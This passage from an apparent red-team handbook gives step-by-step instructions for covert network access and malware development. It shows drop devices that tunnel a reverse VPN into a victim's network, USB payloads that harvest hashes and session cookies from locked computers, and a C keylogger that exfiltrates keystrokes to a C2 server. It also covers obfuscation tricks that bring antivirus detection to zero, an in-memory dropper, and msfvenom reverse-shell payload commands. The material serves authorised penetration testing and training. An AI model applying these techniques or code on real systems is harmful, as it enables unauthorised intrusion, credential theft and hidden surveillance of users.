turtle menu and edit our Firewall rules\nnano /etc/config/firewall\nUnder: config zone 'vpn'\nMake sure \"option forward\" is set to\nACCEPT\nAdd the following config forwarding rules:\nconfig forwarding\noption src              wan\noption dest             lan  \nconfig forwarding                    \noption src              vpn\noption dest             wan\nconfig forwarding\noption src              wan\noption dest             vpn\nLog back into the turtle menu -> Modules -> openvpn -> start\nThis should start the OpenVPN client on our T urtle.  T o make\nsure it works, go back into our OpenVPN AS server and check\nfor connections.\n \nWe now have the LAN Turtle configured so that any time it connects to a\nnetwork, it connects back to our VPN Server and we can SSH into the LAN\nTurtle.  Let's walk through an example:\n \nAccessing the VPN Server from our Kali Attacker Host:\nopenvpn --config ./redteam.ovpn\nWe need  to get the IP Address  of the network they are on in\norder to route all traf fic through from our redteam vpn\nSSH into the LAN T urtle\nExit the Turtle menu and get the IP address of the\ninternal interfac e (ifconfig) of the victim network. \nFigure out the IP range based on the IP and Bcast.  In\nour example, the network that the Turtle is on is\n10.100.100.0/24\nLastly , let's enable forwarding:\nGo back into the OpenVPN AS and edit the user\nlanturtle\nUser Permissions -> for lanturtle -> show\nEdit VPN Gateway to Y es and add internal range (i.e.\n10.100.100.0/24)\nSave and Update\nFrom the SSH connection on the LAN T urtle, reboot with the\ncommand: reboot\n \n \nNow , we can VPN from our Attacker box and route all of our traffic\nthrough the VPN LAN Turtle into the victim corporate netwo rk.  In the\nfollowing image , we are logge d into the VPN server , scannin g the LAN\nTurtle's internal  network of 10.100.100.0/24.  We can see that we have\nsuccessfully configured the routes from the VPN Gateway , through the\nLAN Turtle, to the corp network.  From our Kali Attacker Machine, we can\nrun full vulnerability scans, web scrapes, Masscans, and more.\n \n \nThat’ s it!  You now have a quick-drop device that will let you keep a full\nconnection into a victim network.  A few things you can do to be more\nsuccessful:\nPut a cronjob that resets the device every day.  Tunnels can\nbreak and every time the Turtle reboots, a new connection is\nrestarted.\nSome corporations block certain  ports outbound.  In this case we\nused port 443, which in many environments would be allowed\noutbound.  For other companies that use web proxies, direct\ntraffic outbound via 443, might be blocked.  You may need to\nconfigure the LAN Turtle to automatically try multiple different\nports or protocols (TCP/UDP) on start up. \nIf you are going to drop two or more devices, make sure the\nVPN servers and MAC addresses are different.  We have had\ninstances where our devices were found during engagements and\nalmost every time, it was by accident because IT was moving or\nchanging out computers.\n \nPacket Squirrel\nAnother tool from Hak5 that has similar features as the LAN Turtle is the\nPacket Squirrel.  The Packet Squirrel requires a USB micro to be powered,\nbut instead of one end being a USB Ethernet adaptor , on the Packet\nSquirrel, both ends are Etherne t cables.  This is another discrete way to\neither capture traf fic or create a VPN connection.\n \n \n \nSimilar to the LAN T urtle for configuring the Packet Squirrel;\nEdit the /root/payloads/switch3/payload.sh\nFOR_CLIENTS=1\nEdit /etc/config/firewall\nMake the exact same Firewall changes you did for the\nLAN T urtle\nUpload the LANT urtle.ovpn file to\n/root/payloads/switch3/config.ovpn\n \nYou now have another device that, once connected to the network, will have\na Reverse VPN connection back into the company .\n \nAlso, if you do own a Packet Squirrel, plenty of awesome research has been\ndone on it.  You can easily convert the Packet Squirrel into an OpenWR T-\nbased DYI disposable pen-test drop box (https://medium.com/@tomac/a-\n15-openwrt-based-diy-pen-test-dropbox-26a98a5fa5e5) using SWORD.\n \nResources:\nhttps://www .hak5.or g/episodes/hak5-1921-access-internal-\nnetworks-with-reverse-vpn-connections\nhttp://www .ubuntuboss.com/how-to-install-openvpn-access-\nserver -on-ubuntu-15-10/\nhttps://trick77.com/how-to-set-up-transparent-vpn-internet-\ngateway-tunnel-openvpn/\nhttps://www .hak5.or g/gear/packet-squirrel/docs\n \n \nBash Bunny\nIn the previous books, we talked about the Rubber Ducky\n(https://hakshop.com/collections/usb-rubber -ducky) and how it emulates\nHID devices, like keyboards, to store commands.  As Red Teamers, the\nRubber Ducky is still a great tool as it can speed up the delivery of\nPowerShell commands, be used for social engineering exercises, and can\nallow comprom ises on kiosk systems that might not have a keyboard, but\nhave USB slots.\n \nThe Bash Bunny is the advanced version of this.  Not only can it perform\nHID style attacks, but it can also do a world more.  The Bash  Bunny has\ntwo separate settings to store two attacks (and one extra setting for\nmanagement).  These payloads  can perform attacks to steal credentials,\nconduct phishing, perform Ducky attacks, run PowerShell commands,\nperform scanning and recon, execute Metasploit autopwn, and more. \n \nIn the prior book, we spoke about using KonBoot\n(http://www .piotrbania.com/all/kon-boot/) to get around machines to which\nyou don't have passwords.  KonBoot works on non-encrypted machines,\nwhere it boots up from a USB stick to overwrite the local administrative\npasswords.  Although this does require a full reboot, this gets you onto a\nmachine without credentials.  If you haven't played around with KonBoot,\nwe use it all the time on engagements and have had great success.\n \nThere are two reasons why you may not want to use KonBoot: (1) this\nattack will not work on encrypte d machines, and/or (2) you may not want to\nreboot the victim’ s computer .  How can you get informatio n from the\nlocked system to get access to additional stuff on the network or potentially\nget hashes/credentials?  This is where Bash Bunny comes into play .\n \nWe are going to use the Bash Bunny to run two different attack payloads for\nus.  Both of these payloads will allow us to get information from a locked\n(or unlocked) system if we have physical access to it.  We are going to\ndemonstrate the use of BunnyT ap and QuickCreds.\n \nBreaking into Cyber Space Kittens\nYou have finally broken into the Cyber Space Kittens facility after hours. \nWith no one around you have a few hours to hack around.  You get to your\nfirst machine and drop KonBo ot and reboot the system, but notice these\nsystems are encrypted.  You then go to the next machine which was left at\nthe locked screensaver state.  You plug in your Bash Bunny twice, running\nboth the BunnyT ap and Quic kCreds switches.  After a few minutes,\nQuickCreds, which runs the infamous Responder , collects NetNTLMv2\nhashes.  We throw those into Hashcat and crack the user's password in\nminutes!  On machines where we can't get or crack hashes, BunnyTap spins\nup PosionT ap, which captures  cookies for popular sites and can be\nconfigured for internal applicat ions.  We take these cookies, connect our\nattacker laptop to their network, replace their cookies with ours for sensitive\nweb applications, and gain access to those web applications without ever\nknowing a single password.\n \nSetting Up Bash Bunny on Kali\nDownload the latest Firmware:\nhttps://bashbunny .com/downloads\nPut the Bash Bunny on Switch 3 - Arming Mode (closest to the\nUSB port)\nDrop the firmware on the root of the USB mount, unplug,\nreplug, and wait for about 10 minutes until it blinks blue\nOnce it's all done, go back into the Bash Bunny and edit the file\nunder: payloads > switch1 > payload.txt\n# System default payload\nLED B SLOW\nATTACKMODE ECM_ETHERNET ST ORAGE\nUnplug your device\nOn your Kali Box, set up the internet sharing:\nwget bashbunny .com/bb.sh\nchmod +x bb.sh\n./bb.sh\nGuided Mode (Chose all defaults)\nOn the Bash Bunny , put it on Switch 1 (farthest away from the\nUSB) and plug in.  Once complete, make sure you Connect to\nthe Bash Bunny , where you should see the Cloud <-> Laptop <-\n> Bunny image\nOn your Kali Machine, SSH into the Bash Bunny with password\nhak5bunny\n \nLogging into the Bash Bunny\nOn your Kali Machine, SSH into the Bash Bunny with password\nhak5bunny\nssh root@172.16.64.1\nLet's Update and Install some tools on the Bash Bunny\napt-get update\napt-get upgrade\nexport GIT_SSL_NO_VERIFY=1\ngit clone https://github.com/lgandx/Responder .git\n/tools/responder\ngit clone https://github.com/CoreSecurity/impacket.git\n/tools/impacket\ncd /tools/impacket && python ./setup.py install\napt-get -y install dsnif f\nIn another terminal on your Kali machine, install all the modules\nyou want.\ngit clone https://github.com/hak5/bashbunny-\npayloads.git /opt/bashbunny-payloads\nYou can select any type of payload, but in our case, we are going\nto set up the Bash Bunny with two payloads: BunnyT ap and\nQuickCreds\ncp -R /opt/bashbunny-\npayloads/payloads/library/credentials/BunnyT ap/*\n/media/root/BashBunny/payloads/switch1/\ncp -R /opt/bashbunny-\npayloads/payloads/library/credentials/QuickCreds/*\n/media/root/BashBunny/payloads/switch2/\nNote, in each of the switch1 and 2 folders is a file\nnamed payload.txt.  In each of these files, you need to\nconfigure it to either attack W indows or Mac\nmachines.  For W indows machines, make sure the\nATTACKMODE is set to RNDIS_ETHERNET and\nfor Mac, configure it to ECM_ETHERNET\n \nQuickCr eds\nQuickCreds is an awesome tool that utilizes Responder attack to capture\nNTLMv2 Challenge Hashes from locked and unlocked machines.  Let's say\nyou do a physical assessment where you break into a building and come\nacross a bunch of locked mach ines.  You plug in the Bash Bunny on the\nswitch with QuickCreds and wait about 2 minutes per machine .  The Bash\nBunny will take over the network adaptor , reroute any request s for shares\nand authentication using Response, and then log that data.  It saves all creds\nto the loot folder on the USB Disk.\n \n \nReferences:\nhttps://github.com/hak5/bashbunny-\npayloads/tree/master/payloads/library/credentials/QuickCreds\nhttps://room362.com/post/2016/snagging-creds-from-locked-\nmachines/\n \nBunnyT ap\nBunnyT ap is based on Samy Kamkar's infamous PoisonT ap\n(https://www .youtube.com/watch?v=Aatp5gCskvk).  PoisonT ap was an\nawesome tool that, even from a locked machine, does the following:\n \nEmulates an Ethernet device over USB (or Thunderbolt)\nHijacks all Internet traf fic from the machine (despite being a low\npriority/unknown network interface)\nSiphons and stores HTTP cookies and sessions from the web\nbrowser for the Alexa top 1,000,000 websites\nExposes the internal router to the attacker , making it accessible\nremotely via outbound W ebSocket and DNS rebinding (thanks\nMatt Austin for the rebinding idea!)\nInstalls a persistent web-based backdoor in HTTP cache for\nhundreds of thousands of domains and common JavaScript CDN\nURLs, all with access to the user ’s cookies via cache poisoning\nAllows attacker to remotely force the user to make HTTP\nrequests and proxy back responses (GET & POST s) with the\nuser’s cookies on any backdoored domain\nDoes not require the machine to be unlocked\nBackdoors and remote access persist even after device is\nremoved and attacker sashays away [https://samy .pl/poisontap/]\n \nFrom a physical assessment perspective, you go into their of fice, plug it into\neach machine, and wait about 2 minutes.  The Bash Bunny will route all\ntraffic to the Bash Bunny .  If they have a browser open and active (like ads\nor any page that regularly updates), the BunnyT ap will kick in and request\nall the Alexa top 1,000,00 websites.  If the victim user is logged into any of\nthese sites at the time, the BunnyT ap will capture all of the victim's\ncookies.  Now , we can take these cookies onto our own computers, replace\nour cookies with theirs, and become them without ever knowing their\npasswords. \n \n \nMake sure to check out all the cool Bash Bunny payloads:\nhttps://github.com/hak5/bashbunny-\npayloads/tree/master/payloads/library . \n \nW i F i\nIn terms  of WiFi, there haven't been any significant changes in how we\nattack clients.  Although we are starting to see significantly  less WEP\nnetworks, the attacks still consist of deauth, aireplay-ng, and capturing IV\npackets.  For WPA wireless netw orks, the best option here still is to deauth\na client, capture the handshak e, pass it over to hashcat, and crack the\npassword.  Both these methods work great and my favorite tool to use is the\ncompletely rewritten version of Wifite2 (https://github.com/derv82/wifite2)\nusing an Alfa AWUS036NHA wireless card.  This is a simple-to-use\ninterface as it can support numerous attacks, sits on top of aircrack, and\nmakes it easy to crack the captured hashes.\n \n \nIn terms of equipment, other than getting a couple Alfas, the easy way to\nperform more evasive WiFi attacks is using the WiFi Pineapple Nanos\n(https://www .wifipineapple.com/pages/nano).  If you need to spin up a fake\nHostAP , reroute traffic through  another antenna, stand up fake pages to\ncapture authentication, perform all the MITM attacks, run Responder , and\nother attacks, the Nano is a lightweight hardware tool to perform this. \n \n \nFor those who don't subscribe to the Pineapple, there are some great tools\nout there that do many of the corporate attacks.  One of these tools is\neaphammer (https://github.com /s0lst1c3/eaphammer).  The features of\neaphammer:\n \nSteal RADIUS credentials from WPA-EAP and WPA2-EAP\nnetworks.\nPerform hostile  portal attacks to steal AD creds and perform\nindirect wireless pivots\nPerform captive portal attacks\nBuilt-in Responder integration\nSupport for Open networks and WP A-EAP/WP A2-EAP\nNo manual configuration necessary for most attacks.\nNo manual configuration necessary for installation and setup\nprocess\nLeverages latest version of hostapd (2.6)\nSupport for evil twin and karma attacks\nGenerate timed Powershell payloads for indirect wireless pivots\nIntegrated HTTP server for Hostile Portal attacks\nSupport for SSID cloaking\n \nThe best part of eaphammer is using the custom attack features to perform\nresponder style attacks or capture NTLM challenge authentication hashes\nfor cracking (https://github.com/s0lst1c3/eaphammer#iii---stealing-ad-\ncredentials-using-hostile-portal-attacks) and indirect pivots\n(https://github.com/s0lst1c3/eaphammer#iv---indirect-wireless-pivots). \n \nC o n c l u s i o n\nPhysical attacks are one of the most fun to do.  They get the adrenaline\npumping, make you feel like a criminal, and force you to think evilly .  On\nmany of our engagements, we may spend a couple days just casing a\ncompany , watching the guard rotations, and figuring out what types of\ndoors they have.  We might try to take long range photos of their badges,\nrecord hours when people leave  the building, and identify weak spots that\nwould get us into the building. \n \nFrom a Red Team perspective, we want to take note of weak spots not only\nin their physical security , but in their people as well. \nIf you trigger an alarm, how long does it take for someone to\ncheck it out?\nAre the cameras monitored 24/7?  If so, if something is\nsuspicious, how long until a comes to investigate?\nAre the employees watching for tail-gating?\nIf you do get stopped, are you able to talk your way out of it?\nIf you dress up as someone similar to facilities staff (or any third\nparty service) what types of reactions do you get?\n \nLast note, before  you get started , make sure you have a well-defined scope,\na get out of jail letter , phone numbers for the CISO/Physical Security , and\nbe sure to work with the company .  The more you can detail out, the less\nlikely you will be thrown onto the ground by guards, but there's no\nguarantee . . .\n \n \n \n \n \n \n \n7 the quarterback sneak - evading av and network\ndetection\n \n \n \n \n \nWriting Code for Red Team Campaigns\nOne of the things that sets apart successful Red Teamers and Penetration\nTesters is the ability to adapt and understand different protection s.  Whether\nit is understanding low-level assembly , writing shellcode, creating a custom\nC2 binary , or modifying code caves to hide our malware, it's all part of our\ndaily job.  I come across pentesters all the time who can't code and although\nit is not a requirement, it definitely causes a plateau in their professional\ngrowth.  Therefore, I wanted to dedicate a section to those who haven't\nreally coded in lower -level languages in order to give them a start. \n \nThe Basics Building a Keylogger\nKeyloggers are an essential tool to any pentest/Red Team and this section\nwill walk you through making a generic keylogger .  There are times when\nwe just want to continually monitor a certain user or get additional\ncredentials.  This might be because we can't get any sort of lateral\nmovement/privilege escalation or we might just want to monitor the user for\nfuture campaigns.  In these cases, we like to drop keyloggers that\ncontinually run on a victim's system and send their keystrokes outbound. \nThe following example is just a POC and the purpose of this lab is for you\nto understand the basics and build from here.  The reasons it is all in C are\nto keep the binary relatively small, have better OS control due to lower\nlevel languages, and evade AV.  In the prior book, we wrote a keylogger in\nPython and compiled it with py2exe to make it into a binary , but those can\nbe easily detected.  Let's walk through a slightly more complex example.\nSetting up your envir onment\nThis is the basic setup you need to write and compile in C to make\nWindows binaries and create the custom keylogger .\nWindows 10 in a V irtual Machine\nInstall Visual Studio so that you could use the command line\ncompiler along with V im for code editing\n \nThe best coding resource for Windows API programming  by far is\nMicrosoft’ s own Development Network (MSDN) website found here:\nwww .msdn.microsoft.com. MSDN is an invaluable resou rce that details\nsystem calls, type and struct definitions, and includes dozens of examples.\nWhile it wasn't really needed for this project, a more in-depth understanding\nof the Windows OS can be found by reading the Windows Internals books\npublished by Microsoft Press. For C, there is a good book co-authored by\none of the founders of C called, The C Programming Language by\nKernighan and Ritchie. Lastly , read Beej’s Guide to Network Programming,\navailable in print and online, which is a great primer on socket\nprogramming in C.\nCompiling fr om Sour ce\nIn these  labs, there are going to be multiple code samples and examples. \nThe labs will be compiling the code using Microsoft’ s Optimizing\nCompiler , which  comes with Visual Studio Community and is built into the\nVisual Studio Developer Command Prompt.  Once VS Community is\ninstalled, make sure to also install the Universal Windows Platform\ndevelopment and Desktop development with C++ under Tools -> Get Tools\nand Features.  To compile the examples, open up an instance of the\ndeveloper comm and prompt, then navigate to the folder that contains the\nsource files. Finally , run the command “cl sourcefile.c io.c”. This will\nproduce an executable with the same name as the source file.\n \nThe compiler defaults to 32-bit , but this code can also be compiled in 64-\nbit. To compile the code for 64-bit, run the batch script located in the Visual\nStudio folder . In a command  prompt, navigate to “C:\\Program Files\n(x86)\\Microsoft Visual Studio\\2017\\Community\\VC\\Auxiliary\\B uild”, note\nthat this path might change depending on your version of Visual Studio.\nThen, run the command “vcvarsall.bat x86_amd64”, this will set the\nMicrosoft Compiler to compile 64-bit binaries instead of 32-bit. Now , you\ncan compile the code by running “cl path/to/code.c”.\nSample Framework\nThe goal of this project is to create a keylogger that utilizes C and low-level\nWindows functions to monitor keystrokes.  This keylogger makes use of the\nSetW indowsHookEx and LowLevelKeyboardProc functions. \nSetW indowsHookEx allows the setting of various types of hooks in both\nlocal and global contexts. In this case, the WH_KEYBOARD_LL\nparameter will be used to pull low-level keyboard events.  The function\nprototype for SetW indowsHookEx looks like this (http://bit.ly/2qBEzsC):\n \nHHOOK WINAPI SetW indowsHookEx(\n  _In_ int       idHook,\n  _In_ HOOKPROC  lpfn,\n  _In_ HINST ANCE hMod,\n  _In_ DWORD     dwThreadId\n);\n \nThe function takes an integer to a hook ID, a pointer to a function, a handle\nmodule, and a thread ID. The first two values are the most important.  The\nhook ID is an integer for the type of hook that you are going  to install. \nWindows has the available IDs listed on the function page.  In our case, the\nID 13, or WH_KEYBOARD_L L will be used.  The HOOKPROC is a\npointer to a callback function that will be called every time the hooked\nprocess receives data.  This means that every time a key is pressed, the\nHOOKPROC will be called. This is the function that will be used to write\nthe keystrokes to the file. hMod is a handle to a DLL that contains the\nfunction that the lpfn points to. This value will be set to NULL because a\nfunction is used in the same process as SetW indowsHookEx.  dwThreadId\nwill be 0 to associate the callback with all of the threads on the desktop. \nFinally , the function returns an integer , which will be used to verify that the\nhook was set properly or exit otherwise.\n \nThe second part that is required will be the callback function.  The callback\nfunction will do the heavy lifting for this program.  This function will\nhandle receiving the keystrokes , transforming them into ASCII letters, and\nall of the file operations.  The prototype for the LowLevelKe yBoardProc\n(http://bit.ly/2HomCYQ) looks like this:\n \nLRESUL T CALLBACK LowLevelKeyboardProc(\n  _In_ int    nCode,\n  _In_ WP ARAM wParam,\n  _In_ LP ARAM lParam\n);\n \nLet's review what is required  for the LowLevelKeyBoard Proc.  The\nparameters for the function are an integer that tells Windows how to\ninterpret the message.  Two of these parameters are: (1) wParam, which is\nan identifier of the message, and (2) lParam, which is a pointer to a\nKBDLLHOOKSTRUCT structu re.  The values for wParam are specified in\nthe function page. There is also a page that describes the members of a\nKBDLLHOOKSTRUCT . The value of the lParam KBDLLHOOKSTRUCT\nis the vkCode or Virtual Key Code (http://bit.ly/2EMAGpw).  This is the\ncode for the key that was pressed and not the actual letter as the letters\ncould vary based on the language of the keyboard.  The vkCode will need to\nbe conv erted later to the appropriate letter . For now, do not worry about\npassing parameters to our keyboard callback function because they will be\npassed by the operating system when the hook is activated.\n \nSo, the initial skeleton code for hooking the keyboard would look like this:\nhttps://github.com/cheetz/ceylogger/blob/master/skeleton. \n \nAs you are reviewing the skeleton code, some things to note are the\ninclusion of the pragma comment line, the message loop, and the return\nCallNextHookEx line in the callback function.  The pragma comment line\nis a compiler directive to link the User32 DLL.  This DLL holds  most of the\nfunction calls that will be made and so it is required to be linked.  It could\nalso have been linked with the compiler options. Next, the message loop is\nnecessary if LowLevelKeyboardProc functions are being used.  MSDN\nstates, “This hook is called in the context of the thread that installed it. The\ncall is made by sending a message to the thread that installe d the hook.\nTherefore, the thread that installed the hook must have a message loop.\"\n[http://bit.ly/2HomCYQ]\n \nThe CallNextHookEx is returned because MSDN states “Calling the\nCallNextHookEx function to chain to the next hook procedure is optional,\nbut it is highly  recommended ; otherwise, other applications  that have\ninstalled hooks  will not receive hook notifications and may behave\nincorrectly as a result. You should call CallNextHookEx unless you\nabsolutely need to prevent the notification from being seen by other\napplications.” [http://bit.ly/2H0n68h]\n \nNext, we move on to build the functionality of the callback function starting\nwith a file handl e.  In the example code, it will create a file named “log.txt”\nin the W indows T emp directory (C:\\W indows\\T emp).  The file is configured\nwith append argument because the keylogger needs to continually output\nthe keystrokes to the file.  If the file is not present in temp, one will be\ncreated.\n \nGoing back to the KBDLLHOOKSTRUCT , the code declares a\nKBDLLHOOKSTRUCT pointer and then assigns it to the lParam. This will\nallow access to the parameters within the lParam of each key press. Then\nthe code  checks to see if the wParam returned “WM_KEYDOWN”, which\nwill check if the key was presse d down.  This was done because the hook\nwill trigger on both the press and the release of a key.  If the code did not\ncheck for WM_KEYDOWN, the program would write every key twice.\n \nAfter checking for the downp ress, there would need to be a switch\nstatement that checks the vkCode (virtual key code) of the lParam for\nspecial keys.  Certain keys would need to be written to the file differently\nthan the rest, such as the return, control, shift, space, and tab keys.  For the\ndefault case, the code would need to convert the vkCode of the key to the\nactual letter .  An easy way to perform this conversion would be to use the\nToAscii function .  ToAscii will take the vkCode, a ScanCode, a pointer to\nan array  of the keyboard state, a pointer to the buffer that will receive the\nletter , and an int value for uFlag s.  The vkCode and ScanCode are from the\nkey struct, the keyboard state is a byte array that was declared earlier , a\nbuffer to hold the output, and the uFlags parameter will be set to 0.\n \nIt is essential to check to see if certain keys were released, such as the shift\nkey.  This can be accomplished  by writing another \"if statemen t\" to check\nfor “WM _KEYUP” and then have a “switch statement” to check the keys\nthat are needed. Finally , the file would need to be closed and returned back\nto CallNextHookEx.   The Callback function looks like this:\nhttps://github.com/cheetz/ceylogger/blob/master/callback\n \nAt this point, the keylogger is completely functional. However , there are a\nfew problems.  The first is that running the program spawns a command\nprompt, which makes it very obvious that the program is running, and the\nlack of output on the prompt is pretty suspicious.  Another problem is that\nhaving the file on the same computer on which that keylogger is running,\nisn’t very helpful.\n \nThe command prompt problem can be fixed relatively easily by switching\nthe standard C “Main” function entry point with the Windows specific\nWinMain functio n entry point.  From my understanding, the reason that this\nworks is becaus e WinMain is an entry point for a graphical program on\nWindows.  Although the operating system is expecting you to handle the\ncreation of the windows for the program, we can just tell it not to create\nany, since we have this control.  Now , the program just spawns a process in\nthe background without creating any windows.\n \nThe network side of the program will be straightforward.  Start by\ninitializing the Windows socket functions by declaring WSAData\n(http://bit.ly/2HAiVN7), starting winsock, clearing the hints structure, and\nfilling in the relevant wants.   For our example, the code will use\nAF_UNSPEC for IPV4 and SOC_STREAM for TCP connectiv ity, and use\nthe getaddrinfo function to fill out the c2 struct using the previous wants. \nAfter all of the required parameters are met, a socket can be created. \nFinally , the socket_connect function connects to the socket.\n \nAfter the connection, the socket_sendfile function will be doing most of the\nwork.  It opens a handle to the log file with the Windows “CreateFile”\nfunction, then it gets the file size with the “GetFileSizeEx” function.  Once\nthe file size is obtained, the code will allocate a buffer of that size, plus one\nfor padd ing, and then read the file into that buffer.  Finally , we send the\ncontents of the buf fer over the socket.\n \nFor the server side, a socat listener can be started on the C2 server on port\n3490 (Command  to start socat: socat - TCP4-LISTEN:3490,fork ).  Once the\nlistener is started and the keylogger is running, you should see all the\ncommands from the victim host pushed to the C2 server every 10 minutes. \nThe initial complete version 1 of the keylogger can be found here:\nhttps://github.com/cheetz/ceylogger/tree/master/version1.  Before\ncompiling the version_1.c, make sure to modify the getaddrinfo to your\ncurrent C2 IP address.  T o compile the code: cl version_1.c io.c.\n \nOne final function that should be mentioned is the thread_func function.\nThe thread_func calls the function get_time to get the current  minute.  It\nthen checks to see if that value is divisible by 5, since the tool sends the file\nevery 5 minutes .  If it is divisibl e by 5, it sets up the socket and attempts to\nconnect to the C2.  If the connection is successful, it sends the file and runs\nthe cleanup function.  Then the loop sleeps for 59 seconds.  The reason that\nthe sleep function is necessary is because this is all running in a constant\nloop, which means the function will get the time, set up the connection,\nconnect, and send the file in seconds.  Without the 59 second sleep time, the\nfunction would end up sending the file possibly dozens of times in the 1\nminute interval.  The sleep function allows the loop to wait long enough for\nthe time to change to the next minute and therefore will only send the file\none time every 5 minutes.\n \nObfuscation\nThere are hundreds of different ways to perform obfuscation.  Although this\nchapter can't go through them all, I wanted to provide you with some basic\ntechniques and ideas to get around A V.\n \nAs you may already know , AV tools look for specific strings.  One of the\nsimplest method s that can be used to avoid AV is to create a simple rotation\ncipher and shift the characters of the string.  In the code below , there is a\nbasic decrypt function that moves all strings by 6 characters (ROT6).  This\nresults in garbled strings that may not get detected by AV.  At the start of\nthe program, the code will call a decrypt function to take an array of strings\nand return them to their regular format. The decrypt function is shown\nbelow:\nint decrypt(const char* string, char result[]){\nint key = 6;\nint len = strlen(string);\nfor(int n = 0; n < len; n++){\nint symbol = string[n];\nint e_symbol = symbol - key;\nresult[n] = e_symbol;\n}\nresult[len] = '\\0';\n \nreturn 0;\n}\n \nYou can see an example of this in version 2 of the program here:\nhttps://github.com/cheetz/ceylogger/tree/master/version2. \n \nAnother method  that can be used for evading antivirus is to call the\nfunctions in User32.dll using function pointers, instead of calling the\nfunction directly .  To do this, first write a function definition, then find the\naddress of the function to call by using the Windows GetP rocAddress\nfunction, and lastly , assign the function definition pointer to the address that\nwas received from GetProcAddress.  An example of how to call the\nSetW indowsHookEx function by using a function pointer can be found\nhere:\nhttps://github.com/cheetz/ceylogger/blob/master/version3/version_3.c#L19\n7-L241 (http://bit.ly/2H0VboE).\n \nVersion 3 of the program combines the string encryption from the previous\nexample with the method of calling the functions with pointers.  It is\ninteresting to note that, if you submit the compiled binary to V irusT otal, you\nwill no longer see User32.dll in the imports section.  In the photo below , the\nleft image is Version 1 and the right image is Version 3 with calling\npointers.\n \n \n \nYou can find the whole source code for Version 3 at:\nhttps://github.com/cheetz/ceylogger/tree/master/version3.\n \nIn order to see if you have successfully evaded AV, the best option is to\nalways test it against live AV systems.  In a real world campa ign, I don't\nrecommend ever using VirusT otal, as your samples may be sent to the\ndifferent vendors.  However it is great for testing/learning.  For our\npayloads, here is the V irusT otal Comparison:\n \nFor V ersion 1, 32bit, 1 1/66 triggered A V:\nhttps://www .virustotal.com/#/file/4f7e3e32f50171fa527cd1e53d\n33cc08ab85e7a945cf0c0fcc978ea62a44a62d/detection\nhttp://bit.ly/2IXfuQh\n \nFor V ersion 3, 32bit, 10/66 triggered A V:\nhttps://www .virustotal.com/#/file/8032c4fe2a59571daa83b6e2d\nb09ff2eba66fd299633b173b6e372fe762255b7/detection\nhttp://bit.ly/2IYyM7F\n \nFinally , if we compile V ersion 3 as a 64bit payload, we get 0/66!:\nhttps://www .virustotal.com/#/file/e13d0e84fa8320e310537c7fdc\n4619170bfdb20214baaee13daad90a175c13c0/detection\nhttp://bit.ly/2JNcBmc\n \n \nLab:\nWhere do you go from here?  The ideas are limitless!  A little fix might be\nto obfus cate/encrypt the log.txt contents or to initiate an encrypted socket\nonce the program  starts and then write the keystrokes right to that socket. \nOn the receiving side, the server would reconstruct the stream and write it\nto a file.  This would stop the log data from being seen in plain text, as it\ncurrently is, and also prevent more artifacts from touching disk.\n \nAnother strong improvement would be to convert the executable into a DLL\nand then inject the DLL into a running process.  This would prevent even\nthe process information from showing up in task manager .  Though there\nare programs that will show you all of the currently loaded DLLs on a\nsystem, injecting the DLL would be much stealthier . Additionally , there are\nsome programs that can reflectively load a DLL from memory without\ntouching disk at all, further decreasing your forensic footprint.\n \nTHP Custom Droppers\nDroppers are an important part of a Red Team’ s toolkit, allowing you to run\nyour implants without having them on the victim’ s computer . Keeping your\nimplants off disk reduces the risk of them being compromised, allowing\nyour work to be used multiple times.  In this chapter , we are going to cover\na custom  THP-developed dropp er that imports either shellcode or a DLL\nthat stays resident only in memory .\n \nWhen designing a dropper and corresponding server , there are a few things\nyou need to keep in mind. The purpose of the dropper is to be a use-and-\nburn piece of your arsenal, meaning you will have to assume that using it in\nits current form will trigger detection in further campaigns.\n \nIn order to make future campaigns easier , you will want to develop a\nstandard server , which you can use repeatedly . In the example, you will see\na basic networking implementa tion, which allows for new handlers to be\nregistered for different messages. While this example only includes\nhandlers for a LOAD_BLOB message type, you can easily add new\nhandlers to extend functionality . This makes for a good baselin e, as you\nhave all your communication standardized.\n \nAnother importa nt step when writing droppers, or anything else you expect\nto be found quickly and rever se engineered, is to sanitize your strings.\nDebug messages are great when you are first building software, relieving\nyou from having to manually step through your debugger to see why\nsomething’ s breaking.  Howeve r, if they are accidentally left in on final\nrelease, you will make the analyst’ s job much easier in reversing your\nmalware. Many times anti-viruses will signature something off a unique\nstring, or a constant value. In the example, I use InfoLog() and ErrorLog(),\nwhich the pre-processor will compile out on release builds. Using those\nmacros, which check if _DEBU G is defined, will dictate wheth er or not to\ninclude the relevant calls.\n \nTHP Custom Dropper Code:  https://github.com/cheetz/thpDropper .git\n \nShellcode vs DLLs\nIn the following example, you are able to have the dropper load either full\nDLLs or shellcode. Generally with many public implants, you are able\ngenerate a full DLL, which will download the DLL and then reflect it.\nHaving your dropper load the DLL directly will save you from making a\nfew more API calls, remaining stealthier . Some implants might not load\ncorrectly due to their headers being modified. If one of your implants isn’t\nworking properl y and includes a method to generate shellcode, then this\nshould solve your problem.  This is because their custom loade r is usually\nwritten to fix up the headers and load it from that DLL.\n \nThere is also a large amount of shellcode available online, sites like shell-\nstorm.or g hold archives of shellcode written for specific purposes, some of\nwhich might come in handy for your campaigns.\n \nRunning the Server\nBuilding the server is straightfo rward. On your Custom THP Kali image,\nyou will need to run the following commands:\n \nFor first-time compiling:\ncd /opt/\nsudo apt-get install build-essential libssl-dev cmake git\ngit clone https://github.com/cheetz/thpDropper .git\ncd thpDropper/thpd\nmkdir build\ncd build\ncmake ..\nmake\n \nFor subsequent compiling, all you will need to do is:\ncd /opt/thpd/build\nmake\n \nTo run the server , after you compile it, you will type:\n./thpd [path to shellcode/DLL] [loadtype]\n \nThe following values are currently valid for load type:\n0Shellcode This will send raw shellcode bytes to the client\n1DLL This will send a normal DLL file to be reflectively loaded\nin the client\n \nAlthough these payloads (shellcode/DLL) can be from any type of C2 tool\n(Metasploit/Meterpreter , Cobalt Strike, etc), we will be using a Meterpreter\npayload for our examples.  Generating a Payload:\nFor Shellcode payloads:\nmsfvenom -a x64 -p\nwindows/x64/meterpreter/reverse_http LHOST=\n<Your_IP> LPOR T=<POR T>\nEnableStageEncoding=T rue -f c\nNote, you will have to take the output of msfvenom\nand only take the raw shellcode (remove quotes, new\nlines, and anything not shellcode).\nTo start the server: ./thpd ./shellcode.txt 0\nFor DLL payloads:\nmsfvenom -a x64 -p\nwindows/x64/meterpreter/reverse_http LHOST=\n<Your_IP> LPOR T=<POR T>\nEnableStageEncoding=T rue -f dll > msf.dll\nTo start the server: ./thpd ./msf.dll 1\n \nClient\nThe client functions in a similar way to the server , where it registers 